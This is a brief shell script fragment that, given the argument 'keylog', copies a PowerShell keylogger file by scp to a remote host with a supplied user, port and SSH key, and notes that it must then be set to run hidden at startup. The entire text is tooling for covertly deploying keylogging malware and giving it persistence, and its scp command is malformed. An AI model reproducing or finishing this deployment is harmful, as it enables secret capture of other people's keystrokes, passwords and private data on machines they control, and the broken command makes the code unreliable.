# send file via SCP
case ${1} in
keylog) scp /keylogger.ps1 ssh ${2}@${3} -p ${4} -i #path to loginRSAKEY
  
  ;;
esac

# then needs to be set to run on startup in a closed window
